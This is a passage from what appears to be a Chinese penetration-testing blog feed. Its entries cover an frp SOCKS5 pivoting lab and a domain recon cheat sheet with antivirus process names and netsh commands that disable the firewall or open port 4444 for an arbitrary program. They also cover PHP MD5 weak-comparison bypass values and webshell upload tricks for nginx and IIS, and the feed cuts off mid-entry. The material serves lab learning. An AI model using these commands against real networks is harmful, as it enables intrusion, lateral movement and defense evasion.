    <content type="html"><![CDATA[<h3 id="三层内网穿透实验"><a href="#三层内网穿透实验" class="headerlink" title="三层内网穿透实验"></a>三层内网穿透实验</h3><h4 id="一、实验环境"><a href="#一、实验环境" class="headerlink" title="一、实验环境"></a>一、实验环境</h4><ul><li>VM16pro windows server 2019 R2，win10_02的克隆虚拟机，win10_03的克隆虚拟机，frp_0.46.1_windows_amd64，Proxifier PE</li></ul><h4 id="二、实验配置参数"><a href="#二、实验配置参数" class="headerlink" title="二、实验配置参数"></a>二、实验配置参数</h4><ul><li><p>windows server 2019 R2 选择“选择—&gt;虚拟网络编辑器”，创建三张新网卡，三张网卡设置IP段如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">vm10</span><span class="hljs-params">(仅主机)</span></span>:<span class="hljs-number">192.168</span>.<span class="hljs-number">168.0</span><br><span class="hljs-function"><span class="hljs-title">vm11</span><span class="hljs-params">(仅主机)</span></span>:<span class="hljs-number">172.16</span>.<span class="hljs-number">16.0</span><br><span class="hljs-function"><span class="hljs-title">vm12</span><span class="hljs-params">(仅主机)</span></span>:<span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span><br></code></pre></td></tr></table></figure></li><li><p>windows server 2019 R2—创建两张新网卡vm10,vm11</p></li><li><p>win10_02—创建两张新网卡vm11,vm12</p></li><li><p>win10_03—创建一张新网卡vm12</p></li></ul><h4 id="三、实验步骤"><a href="#三、实验步骤" class="headerlink" title="三、实验步骤"></a>三、实验步骤</h4><ul><li>windows server 2019 R2中frp可开启也可不开启，如果开启，客户端连接上服务端将客户端的端口映射到服务端公网端口上</li><li>先让win10_02与win10_03打通再让server2019与win10_02互通，最后在server2019上使用PE访问win10_03上的网页内容</li><li>首先设置server2019上的网卡，在vm设置中移除原有网络适配器，重新添加两个新的网络适配器分别为vm10,vm11，如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302081949622.png" alt="image-20230208194607766"></p><ul><li><p>同样的方法设置win10_02和win10_03的网络适配器</p></li><li><table><thead><tr><th>主机名</th><th>网络适配器1</th><th>网络适配器2</th></tr></thead><tbody><tr><td>server2019 R2</td><td>192.168.168.123</td><td>172.16.16.111</td></tr><tr><td>win10_02</td><td>172.16.16.2</td><td>10.0.0.1</td></tr><tr><td>win10_03</td><td>10.0.0.2</td><td></td></tr></tbody></table></li><li><p>由于这里模拟是server2019是被渗透的主机，通过模拟内网信息收集得知，最内层网络中存在win10_02与win10_03，使用ping命令发现，只有server2019与win10_02可以ping通。所以先在server2019上开启服务端，让win10_02连接server2019，再win10_02上通过ping查看win10_02与win10_03互通，所以在win10_02上重新启动一个服务端，在win10_03上启动一个客户端，让win10_02与win10_03相连接，然后在server2019上使用PE，此时就能实现在被渗透的主机上访问内网中最深层的主机</p></li><li><p>win10_02客户端配置文件,服务端配置文件使用默认7000端口</p></li><li><pre><code class="hljs">[common]server_addr = 172.16.16.111 # win10_02的IP地址server_port = 7000[socket_192]  # 配置文件中名称不能重复使用type = tcpremote_port = 8000  # 端口使用一个不被占用的端口plugin = socks5[socket_172]type = tcpplugin = socks5local_ip = 127.0.0.1local_port = 9999  remote_port = 9000  # 将本地的9999端口映射到公网9000端口上，外网访问9000端口实际上就访问的是本地9999端口 <figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs elm"><br>-   win10_03客户端配置文件，服务端使用默认<br><br>-   ```<br>    [common]<br>    server_addr = <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.137</span> # win10_02主机的<span class="hljs-type">IP</span>地址<br>    server_<span class="hljs-keyword">port</span> = 7000<br>    <br>    [socks_172_10]<br>    <span class="hljs-keyword">type</span> = tcp<br>    plugin = socks5<br>    remote_<span class="hljs-keyword">port</span> = 9999<br></code></pre></td></tr></table></figure></code></pre></li><li><p>当客户端出现<code>start proxy success</code>，服务端出现 <code>type [tcp] success</code> 关键词时则表明连接成功</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302082125250.png" alt="image-20230208212534056"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302082125281.png" alt="image-20230208212504525"></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302082126436.png" alt="image-20230208212604177"></p><ul><li>在win10_03上开启小皮面板，然后再server2019上使用PE，使用浏览器查看是否能访问到最内层主机</li><li>再PE上，配置127.0.0.1：9000,代理走socks5</li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302082129569.png" alt="image-20230208212946591"></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302082130943.png" alt="image-20230208213037472"></p><h4 id="四、备注"><a href="#四、备注" class="headerlink" title="四、备注"></a>四、备注</h4><ul><li>如果有连接失败的情况，首先检查服务端和客户端的配置文件中IP地址是否填写错误。</li><li>检查虚拟机中的虚拟网络设置的网段划分是否是常见内网地址。</li><li>检查每台虚拟机中的虚拟网卡是否设置为自定义(仅主机模式)。</li><li>查看每台主机的网址划分，然后使用Ping进行查看对应主机是否通信正常，如果不正常尝试关闭防火墙。</li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
      <tag>FRP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单域环境搭建以及内网信息收集</title>
    <link href="/2022/11/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F---%E7%AE%80%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/11/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F---%E7%AE%80%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h3 id="简单域环境搭建以及内网信息收集"><a href="#简单域环境搭建以及内网信息收集" class="headerlink" title="简单域环境搭建以及内网信息收集"></a>简单域环境搭建以及内网信息收集</h3><h4 id="一、实验环境"><a href="#一、实验环境" class="headerlink" title="一、实验环境"></a>一、实验环境</h4><p>windows server 2019， win10 ，win7(配置方法与Win10一致，因为本人Win7是家庭版，所以这里用两个win10虚拟机模拟环境)</p><h4 id="二、操作步骤"><a href="#二、操作步骤" class="headerlink" title="二、操作步骤"></a>二、操作步骤</h4><h5 id="1、在windows-server-2019中设置静态IP"><a href="#1、在windows-server-2019中设置静态IP" class="headerlink" title="1、在windows server 2019中设置静态IP"></a>1、在windows server 2019中设置静态IP</h5><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021733238.png" alt="image-20230202173333526"></p><ul><li>把上述三个内容填入下图，其中首先DNS服务器地址与默认网关地址相同</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021736415.png" alt="image-20230202173612756"></p><ul><li>同样操作，在win10中操作跟上述配置一样，只是在DNS服务器选项中设置为server2019的IP地址，同时这里将两台win10虚拟机的计算机名称进行更改后重启。server2019的这台虚拟机的名称更改为“DC”</li></ul><h5 id="2、配置windows-server-2019"><a href="#2、配置windows-server-2019" class="headerlink" title="2、配置windows server 2019"></a>2、配置windows server 2019</h5><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021743241.png" alt="image-20230202174329396"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021744719.png" alt="image-20230202174400936"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021744967.png" alt="image-20230202174435994"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021745173.png" alt="image-20230202174523999"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021746742.png" alt="image-20230202174602545"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021747694.png" alt="image-20230202174738514"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021747863.png" alt="image-20230202174754363"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021748390.png" alt="image-20230202174814270"></p><ul><li><p>一直安装后将此服务器提升为域控制器</p></li><li><p>选择添加新林，设置根域名为 test.local ，这里最好不要填外网有的域名，不然很容易出错。下一步</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021751999.png" alt="image-20230202175131825"></p></li><li><p>输入还原模式密码，这个密码可以与 Administrator 账号密码不一致</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021751003.png" alt="image-20230202175141152"></p></li></ul><p>(这里忘记截图，所以随手拿一个图过来，只需要关注密码即可，别的都选默认选项)</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021752099.png" alt="image-20230202175158990"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021752667.png" alt="image-20230202175214185"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021752025.png" alt="image-20230202175229329"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021752369.png" alt="image-20230202175236437"></p><ul><li>安装完后会重启，重启后，在输入账号处，可以看到账号名称发生了变化，变成了 TEST\Administrator ，这是域账号的登录模式，要登录一个域，需要在账号前面加上域名称和斜杠。输入密码登录系统。如果要登录本地账号，则需要输入.\administrator 来登录</li><li>win7需要企业版或者旗舰版，家庭版则无法加入域</li></ul><h5 id="3、加入域"><a href="#3、加入域" class="headerlink" title="3、加入域"></a>3、加入域</h5><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021758314.png" alt="image-20230202175849358"></p><p>此时会要求输入 test.local 域的域管理员密码，也就是 Windows Server 2019 上的 administrator 账号的密码。</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021759352.png" alt="image-20230202175924348"></p><h5 id="4、设置用户"><a href="#4、设置用户" class="headerlink" title="4、设置用户"></a>4、设置用户</h5><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021801234.png" alt="image-20230202180121044"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021802600.png" alt="image-20230202180207464"></p><ul><li>加入域后，还需要有域账号才能登录域，我们先创建两个部门，分别是运维部和行政部，在 test.local 上右键-&gt;新建-&gt;组织单位</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021803093.png" alt="image-20230202180326109"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021804340.png" alt="image-20230202180401277"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021804409.png" alt="image-20230202180449150"></p><ul><li><p>同样的方法在另一个部门里面也创建一个用户</p></li><li><p>创建完用户后，到 john.test.local 计算机，也就是 windows 10 上登录 Jack 账号，点击切换用户</p></li><li><p>我们可以在 Jack.test.local 主机上运行 cmd，执行命令查看一些信息</p></li></ul><h4 id="三、cmd下信息收集常用命令操作"><a href="#三、cmd下信息收集常用命令操作" class="headerlink" title="三、cmd下信息收集常用命令操作"></a>三、cmd下信息收集常用命令操作</h4><h5 id="3-1、判断当前主机是否在域环境中"><a href="#3-1、判断当前主机是否在域环境中" class="headerlink" title="3.1、判断当前主机是否在域环境中"></a>3.1、判断当前主机是否在域环境中</h5><h6 id="3-1-1、查看网卡配置信息"><a href="#3-1-1、查看网卡配置信息" class="headerlink" title="3.1.1、查看网卡配置信息"></a>3.1.1、查看网卡配置信息</h6><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021812520.png" alt="image-20230202181256175"></p><h6 id="3-1-2、查看系统配置"><a href="#3-1-2、查看系统配置" class="headerlink" title="3.1.2、查看系统配置"></a>3.1.2、查看系统配置</h6><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systeminfo</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021818056.png" alt="image-20230202181816924"></p><ul><li>主要看域那一栏，如果不在域环境中则是WORKGROUP</li></ul><h6 id="3-1-3、查看当前登录域及登录用户信息"><a href="#3-1-3、查看当前登录域及登录用户信息" class="headerlink" title="3.1.3、查看当前登录域及登录用户信息"></a>3.1.3、查看当前登录域及登录用户信息</h6><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">net config workstation<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021821928.png" alt="image-20230202182116182"></p><ul><li>不存在域环境为 WORKGROUP。</li></ul><h6 id="3-1-4、时间同步命令"><a href="#3-1-4、时间同步命令" class="headerlink" title="3.1.4、时间同步命令"></a>3.1.4、时间同步命令</h6><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net <span class="hljs-built_in">time</span> /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021824937.png" alt="image-20230202182421878"></p><ul><li>如果不在则是：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021825348.png" alt="image-20230202182507991"></p><h5 id="3-2、本机信息收集"><a href="#3-2、本机信息收集" class="headerlink" title="3.2、本机信息收集"></a>3.2、本机信息收集</h5><h6 id="3-2-1、查看用户当前登录"><a href="#3-2-1、查看用户当前登录" class="headerlink" title="3.2.1、查看用户当前登录"></a>3.2.1、查看用户当前登录</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021827174.png" alt="image-20230202182721132"></p><h6 id="3-2-2、查看网络配置信息"><a href="#3-2-2、查看网络配置信息" class="headerlink" title="3.2.2、查看网络配置信息"></a>3.2.2、查看网络配置信息</h6><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><h6 id="3-3-3、查询操作系统和版本信息"><a href="#3-3-3、查询操作系统和版本信息" class="headerlink" title="3.3.3、查询操作系统和版本信息"></a>3.3.3、查询操作系统和版本信息</h6><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">systeminfo | findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS Name&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS Version&quot;</span><br>systeminfo | findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 名称&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 版本&quot;</span><br></code></pre></td></tr></table></figure><ul><li>此信息可以推测系统可能存在的系统漏洞，针对性收集相应漏洞信息。</li></ul><h6 id="3-3-4、查看操作系统体系结构"><a href="#3-3-4、查看操作系统体系结构" class="headerlink" title="3.3.4、查看操作系统体系结构"></a>3.3.4、查看操作系统体系结构</h6><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">echo</span> <span class="hljs-variable">%PROCESSOR_ARCHITECTURE%</span><br></code></pre></td></tr></table></figure><h6 id="3-3-5、查看本机安装软件版本信息"><a href="#3-3-5、查看本机安装软件版本信息" class="headerlink" title="3.3.5、查看本机安装软件版本信息"></a>3.3.5、查看本机安装软件版本信息</h6><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic product <span class="hljs-keyword">get</span> <span class="hljs-type">name</span>,<span class="hljs-keyword">version</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021829014.png" alt="image-20230202182957681"></p><ul><li>这里能查出来的都是在安装时候出现那种下一步下一步的，还有一种是直接安装(安装包下载后直接点击安装没有那种下一步的操作)这类软件这个命令是查询不到的</li></ul><h6 id="3-3-6、查询服务信息"><a href="#3-3-6、查询服务信息" class="headerlink" title="3.3.6、查询服务信息"></a>3.3.6、查询服务信息</h6><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">wmic service list brief</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021833716.png" alt="image-20230202183259152"></p><ul><li>等同于任务管理器的服务那一栏</li></ul><h6 id="3-3-7、查询进程信息"><a href="#3-3-7、查询进程信息" class="headerlink" title="3.3.7、查询进程信息"></a>3.3.7、查询进程信息</h6><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">tasklist /v<br>wmic process list brief<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302021835931.png" alt="image-20230202183434697"></p><ul><li>常见杀毒进程</li></ul><table><thead><tr><th>进程名</th><th>软件</th></tr></thead><tbody><tr><td>360sd.exe</td><td>360杀毒</td></tr><tr><td>360tray.exe</td><td>360实时保护</td></tr><tr><td>ZhuDongFangYu.exe</td><td>360主动防御</td></tr><tr><td>KSafeTray.exe</td><td>金山卫士</td></tr><tr><td>SafeDogUpdateCenter.exe</td><td>安全狗</td></tr><tr><td>McAfee McShield.exe</td><td>McAfee</td></tr><tr><td>egui.exe</td><td>NOD32</td></tr><tr><td>AVP.exe</td><td>卡巴斯基</td></tr><tr><td>avguard.exe</td><td>小红伞</td></tr><tr><td>bdagent.exe</td><td>BitDefende</td></tr></tbody></table><h6 id="附表"><a href="#附表" class="headerlink" title="附表"></a>附表</h6><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic startup <span class="hljs-keyword">get</span> command,caption  <span class="hljs-comment">---查询启动程序信息</span><br>schtasks /query /fo LIST /v <span class="hljs-comment">---程序计划任务</span><br>net <span class="hljs-keyword">statistics</span> workstation <span class="hljs-comment">---查询主机开机时间</span><br>net <span class="hljs-keyword">user</span> <span class="hljs-comment">---查询本机用户列表</span><br>net localgroup<br>net localgruop administrators <span class="hljs-comment">---查询本机用户组与管理员组列表</span><br>query <span class="hljs-keyword">user</span> || qwinsta <span class="hljs-comment">---查询当前在线用户</span><br>net <span class="hljs-keyword">session</span> <span class="hljs-comment">---列出或断开本地计算机与所连接的客户端之间的会话</span><br>netstat -ano <span class="hljs-comment">--- 查询端口信息</span><br>systeminfo<br>wmic qfe <span class="hljs-keyword">get</span> Caption,Description,HotFixID,InstalledOn <span class="hljs-comment">---查询补丁信息</span><br>net <span class="hljs-keyword">share</span> <span class="hljs-comment">---查询本机共享列表</span><br>route print<br>arp -a <span class="hljs-comment">---查询路由信息与 arp 缓存表</span><br><br></code></pre></td></tr></table></figure><h4 id="3-3、防火墙"><a href="#3-3、防火墙" class="headerlink" title="3.3、防火墙"></a>3.3、防火墙</h4><ul><li>windows server 2003及以下版本:</li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">netsh firewall <span class="hljs-keyword">show </span><span class="hljs-built_in">config</span><br></code></pre></td></tr></table></figure><ul><li>window server 2003以上版本：</li></ul><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">netsh advfirewall show allprofiles <span class="hljs-keyword">state</span><br></code></pre></td></tr></table></figure><ul><li><p>开启，关闭防火墙：</p><ul><li><p>Windows server 2003及之前版本：</p><ul><li><p>netsh firewall set opmode disable  #关闭</p></li><li><p>netsh firewall set opmode enable   #开启</p></li></ul></li><li><p>Windows server 2003之后版本：</p><ul><li><p>netsh advfirewall set allprofiles state off  #关闭</p></li><li><p>netsh advfirewall set allprofiles state on   #开启</p></li></ul></li></ul></li><li><p>修改防火墙规则(需要管理员权限)</p></li><li><pre><code class="hljs">Windows server 2003及以下版本，允许指定端口、程序连接：    netsh firewall add portopening tcp 4444 test   #指定端口        netsh firewall add allowedprogram c:\a.exe test enable   #指定程序Windows server 2003之后版本，允许指定端口、程序进站、出站：netsh advfirewall firewall add rule name=test dir=in action=allow         protocol=tcp localport=4444  #允许4444端口进站 netsh advfirewall firewall add rule name=test dir=in action=allow         program=c:\a.exe  #允许a.exe进站  netsh advfirewall firewall add rule name=test dir=out action=allow         protocol=tcp localport=4444   #允许4444端口出站    netsh advfirewall firewall add rule name=test dir=out action=allow         program=c:\a.exe   #允许a.exe出站</code></pre></li></ul><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul><li><a href="https://www.wangan.com/p/7fygf36b9df57f04#%E2%97%8F%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4">https://www.wangan.com/p/7fygf36b9df57f04#%E2%97%8F%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4</a></li><li><a href="https://xz.aliyun.com/t/7663">https://xz.aliyun.com/t/7663</a></li><li><a href="https://cloud.tencent.com/developer/article/1885721">https://cloud.tencent.com/developer/article/1885721</a></li><li><a href="https://juejin.cn/post/7144153351943372830">https://juejin.cn/post/7144153351943372830</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
      <tag>域环境</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞原理---PHP特性&amp;缺陷对比函数</title>
    <link href="/2022/10/14/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86---PHP%E7%89%B9%E6%80%A7-%E7%BC%BA%E9%99%B7%E5%AF%B9%E6%AF%94%E5%87%BD%E6%95%B0/"/>
    <url>/2022/10/14/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86---PHP%E7%89%B9%E6%80%A7-%E7%BC%BA%E9%99%B7%E5%AF%B9%E6%AF%94%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="PHP特性-缺陷-过滤函数"><a href="#PHP特性-缺陷-过滤函数" class="headerlink" title="PHP特性&amp;缺陷&amp;过滤函数"></a>PHP特性&amp;缺陷&amp;过滤函数</h3><h4 id="一、常见过滤函数"><a href="#一、常见过滤函数" class="headerlink" title="一、常见过滤函数"></a>一、常见过滤函数</h4><ul><li><p>&#x3D;&#x3D;与&#x3D;&#x3D;&#x3D;</p><ul><li><p>&#x3D;：赋值</p></li><li><p>&#x3D;&#x3D;：弱类型对比</p></li><li><p>&#x3D;&#x3D;&#x3D;：类型也会对比</p></li><li><pre><code class="hljs">&lt;?php$flag = &quot;欢迎吃瓜~~~~&quot;;$String = &quot;^_^&quot;;$error = &quot;Waring !!!!&quot;;if($_GET[&#39;name&#39;] != $_GET[&#39;password&#39;])&#123;    if(MD5($_GET[&#39;name&#39;]) == MD5($_GET[&#39;password&#39;]))&#123;        echo $flag;    &#125;else&#123;        echo $String;    &#125;&#125;else&#123;    echo $error;&#125;// name = QNKCDZO           0E830400451993494058024219903391// Password = 240610708     0E462097431906509019562988736854&lt;?php$flag = &quot;欢迎吃瓜~~~~&quot;;$String = &quot;^_^&quot;;$error = &quot;Waring !!!!&quot;;if($_GET[&#39;name&#39;] != $_GET[&#39;password&#39;])&#123;    if(MD5($_GET[&#39;name&#39;]) === MD5($_GET[&#39;password&#39;]))&#123;        echo $flag;    &#125;else&#123;        echo $String;    &#125;&#125;else&#123;    echo $error;&#125;</code></pre></li><li><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202303082308539.png" alt="image-20230308230823166"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202303082311073.png" alt="image-20230308231124204"></p></li></ul></li><li><p>md5</p></li><li><p>intval</p></li><li><p>strpos</p><ul><li>可以使用<code>%0a</code>绕过</li></ul></li><li><p>in_array</p><ul><li>问题出现在第三个参数上，如果不设置为true，则函数不会检查数据与数组的值类型是否相同</li></ul></li><li><p>preg_match</p><ul><li>数组绕过</li><li>换行绕过</li></ul></li><li><p>str_replace</p></li><li><p>可以使用双写绕过，比如:<code>x=texttext</code></p></li></ul><p>  ​    </p>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP危险函数</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞原理---文件上传漏洞</title>
    <link href="/2022/10/14/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86---%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/10/14/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86---%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><ul><li>后端存在文件上传的功能，并且没有对上传的文件内容，大小，类型做严格的安全限制。导致攻击者可以使用恶意文件直接威胁服务器</li></ul><h4 id="挖掘点："><a href="#挖掘点：" class="headerlink" title="挖掘点："></a>挖掘点：</h4><ul><li>上传头像</li><li>上传文档</li><li>发表文章，发表评论中的插入图片</li></ul><h4 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h4><ul><li>未限制文件内容或者类型<ul><li>网站被<code>getshell</code></li><li>服务器被提权</li></ul></li><li>未限制文件大小<ul><li>服务器拒绝服务攻击</li></ul></li></ul><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><h5 id="1、Nginx服务-通常运行在Linux上，如果运行在Windows上，也可以使用windows特性绕过"><a href="#1、Nginx服务-通常运行在Linux上，如果运行在Windows上，也可以使用windows特性绕过" class="headerlink" title="1、Nginx服务(通常运行在Linux上，如果运行在Windows上，也可以使用windows特性绕过)"></a>1、Nginx服务(通常运行在Linux上，如果运行在Windows上，也可以使用windows特性绕过)</h5><ul><li>文件名解析逻辑漏洞<ul><li>前提条件<ul><li>nginx 0.8.41-1.4.3或1.5.0-1.5.7</li><li>上传：<code>webshell.jpg空格</code>，访问:<code>webshell.jpg.php</code> <code>00</code>这里使用HEX编辑，不能使用空格</li></ul></li></ul></li><li>00截断：<ul><li>前提条件<ul><li>版本0.5、0.6、0.7&lt;&#x3D;0.7.65，0.8&lt;&#x3D;0.8.37</li></ul></li><li>上传：<code>webshell.jpg空格</code>，访问:<code>webshell.jpg.php</code> <code>00</code>这里使用HEX编辑，不能使用空格</li></ul></li><li>解析漏洞：<ul><li>前提条件：<ul><li>PHP配置<code>cgi.fix_pathinfo</code>开启</li><li>上传：<code>webshell.jpg</code>图片马，访问<code>webshell,jpg/.php</code></li></ul></li></ul></li></ul><h5 id="2、IIS服务-IIS服务部署在windows上，可以利用windows特性和IIS对应的解析漏洞绕过"><a href="#2、IIS服务-IIS服务部署在windows上，可以利用windows特性和IIS对应的解析漏洞绕过" class="headerlink" 